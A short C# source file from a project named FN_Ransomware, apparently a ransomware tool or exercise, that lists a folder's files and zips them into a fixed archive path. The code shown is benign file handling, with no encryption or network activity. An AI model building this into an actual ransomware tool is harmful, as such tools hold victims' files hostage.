using FN_Ransomware.Interface;

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.IO.Compression;

namespace FN_Ransomware
{
    public class MetodosFiles : IMetodosFiles
    {
        public bool GenerarArchivo(string[] rutaArchivo)
        {
            string zipPath = "C:\\ArchivosPDF\\Comprimido.zip";

            using (var zip = ZipFile.Open(zipPath, ZipArchiveMode.Create))
            {
                foreach (var item in rutaArchivo)
                {
                    Console.WriteLine(item);
                    zip.CreateEntryFromFile(item, Path.GetFileName(item));
                }
            }

            return true;
        }

        public string[] listadoArchivos(string path)
        {
            return Directory.GetFiles(path);
        }
    }
}
